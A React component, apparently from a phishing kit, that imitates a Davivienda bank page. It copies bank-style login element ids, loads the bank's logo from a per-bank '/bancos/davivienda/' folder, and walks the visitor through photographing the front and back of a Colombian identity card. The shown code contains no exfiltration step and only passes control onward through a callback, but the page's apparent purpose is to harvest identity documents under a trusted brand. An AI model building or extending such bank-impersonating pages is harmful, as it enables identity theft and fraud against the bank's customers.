/* eslint-disable @next/next/no-img-element */
"use client";

export default function PasoInstruccionesDoc({ side, onContinue }: { side: "front" | "back"; onContinue: () => void }) {
  const isFront = side === "front";
  
  return (
    
    <div id="formAutenticar:loginp" className="loginp" style={{ fontFamily: "'Manrope', sans-serif" }}>
      <div className="wrap container-fluid">
        <div id="formAutenticar:panelContainer" className="form-container">
          <div id="formAutenticar:panelGroupMain" className="auth-form-container" style={{ padding: "24px", textAlign: "center" }}>
    
      <style dangerouslySetInnerHTML={{
        __html: `
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&display=swap');
        .font-manrope { font-family: 'Manrope', sans-serif; }
        
        .premium-card-mockup {
          position: relative;
          width: 220px;
          height: 130px;
          background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
          border-radius: 12px;
          box-shadow: 0 10px 25px rgba(0,0,0,0.1);
          overflow: hidden;
          transition: all 0.3s ease;
          border: 1px solid rgba(21,101,192,0.15);
          margin: 0 auto;
        }
        
        .premium-card-mockup::before {
          content: '';
          position: absolute;
          top: -50%;
          left: -50%;
          width: 200%;
          height: 200%;
          background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 70%);
          transform: rotate(30deg);
        }
      `}} />

      {/* Logo */}
      <div style={{ display: "flex", justifyContent: "center", width: "100%", marginTop: "24px", marginBottom: "32px" }}>
          <img src="/bancos/davivienda/css/logo-davivienda.svg" style={{ height: "24px", width: "auto" }} alt="Logo" />
      </div>

      <div className="mb-2 text-center">
        <h2 className="text-[22px] font-extrabold text-[#2C2A29] font-manrope">
          Verificación de Documento
        </h2>
      </div>

      <div className="text-[12px] font-extrabold text-[#ED1C27] tracking-widest mb-6 text-center">
        {isFront ? "PASO 1 DE 3" : "PASO 2 DE 3"}
      </div>

      {/* Ilustración de cédula digital */}
      <div className="flex justify-center items-center py-8 px-6 mb-8 bg-[#f8f9fa] rounded-[24px] border border-gray-200">
        <div className="premium-card-mockup">
          {isFront ? (
            <>
              {/* Frente de la cédula */}
              <div className="absolute top-[8px] left-0 w-full text-center text-[6px] font-bold text-[#1565c0]/80 tracking-wide font-manrope">
                REPÚBLICA DE COLOMBIA
              </div>
              <div className="absolute top-[16px] left-0 w-full text-center text-[5px] text-[#1565c0]/60 font-manrope">
                DOCUMENTO DE IDENTIDAD
              </div>
              {/* Foto silueta */}
              <div className="absolute bottom-[20px] left-[15px] w-[45px] h-[55px] bg-[#90caf9]/50 rounded border border-[#64b5f6]/40 flex items-center justify-center">
                <svg viewBox="0 0 24 24" fill="currentColor" className="w-6 h-6 text-[#1565c0]/50">
                  <path fillRule="evenodd" d="M7.5 6a4.5 4.5 0 119 0 4.5 4.5 0 01-9 0zM3.751 20.105a8.25 8.25 0 0116.498 0 .75.75 0 01-.437.695A18.683 18.683 0 0112 22.5c-2.786 0-5.433-.608-7.812-1.7a.75.75 0 01-.437-.695z" clipRule="evenodd" />
                </svg>
              </div>
              {/* Text lines */}
              <div className="absolute top-[32px] left-[70px] w-[100px] h-[3px] bg-[#1565c0]/35 rounded"></div>
              <div className="absolute top-[42px] left-[70px] w-[80px] h-[3px] bg-[#1565c0]/35 rounded"></div>
              <div className="absolute top-[52px] left-[70px] w-[90px] h-[3px] bg-[#1565c0]/35 rounded"></div>
              <div className="absolute top-[64px] left-[70px] w-[70px] h-[5px] bg-[#1565c0]/60 rounded"></div>
              <div className="absolute bottom-[10px] left-[15px] w-[190px] h-[2px] bg-[#90caf9]/40 rounded"></div>
            </>
          ) : (
            <>
              {/* Reverso de la cédula */}
              {/* Barcode representation */}
              <div className="absolute top-[20px] left-[15px] w-[110px] h-[25px] border-b border-t border-dashed border-[#1565c0]/30 flex flex-col justify-between py-[2px]">
                <div className="w-full h-[1.5px] bg-gray-500/35"></div>
                <div className="w-[85px] h-[1.5px] bg-gray-500/35"></div>
                <div className="w-[95px] h-[1.5px] bg-gray-500/35"></div>
              </div>
              {/* Huella */}
              <div className="absolute top-[20px] right-[15px] w-[45px] h-[55px] border border-[#64b5f6]/30 bg-[#90caf9]/30 rounded flex items-center justify-center">
                <svg viewBox="0 0 24 24" fill="none" stroke="#1565c0" strokeWidth="1" className="w-6 h-6 opacity-40">
                  <path d="M12 2a5 5 0 0 0-5 5v3a5 5 0 0 0 10 0V7a5 5 0 0 0-5-5z" />
                  <path d="M17 10c0 3-1.8 6-5 8s-5-5-5-8" />
                </svg>
              </div>
              {/* Text lines */}
              <div className="absolute bottom-[35px] left-[15px] w-[120px] h-[3px] bg-[#1565c0]/35 rounded"></div>
              <div className="absolute bottom-[25px] left-[15px] w-[100px] h-[3px] bg-[#1565c0]/35 rounded"></div>
              <div className="absolute bottom-[10px] left-[15px] w-[190px] h-[2px] bg-[#90caf9]/40 rounded"></div>
            </>
          )}
          {/* Foco de escáner */}
          <div className="absolute inset-2 border border-dashed border-[#ED1C27]/50 rounded-lg pointer-events-none animate-pulse"></div>
        </div>
      </div>

      <div className="text-[15px] font-medium text-gray-500 mb-8 leading-relaxed px-4 font-manrope text-center">
        Ubica la <br />
        <span className="text-[#2C2A29] font-bold text-lg">{isFront ? "PARTE FRONTAL" : "PARTE TRASERA"}</span><br /> 
        de tu documento de identidad dentro del recuadro de la cámara y mantén el pulso firme.
      </div>

      <div className="space-y-3 font-manrope">
        <button
          className="w-full py-4 text-white font-bold text-lg rounded-xl transition-all"
          style={{ backgroundColor: "#ED1C27" }}
          onClick={onContinue}
        >
          Tomar Foto
        </button>

        <button
          className="w-full py-2 text-[#2C2A29] hover:text-[#ED1C27] font-bold text-sm bg-transparent transition-colors"
          onClick={() => window.location.reload()}
        >
          Cancelar
        </button>
      </div>

      <p className="mt-6 text-[12px] text-gray-400 font-medium leading-tight font-manrope text-center">
        Evita los reflejos de luz directa y asegúrate de que el texto sea perfectamente legible.
      </p>
    
            </div>
          </div>
        </div>
      </div>
    
  );
}
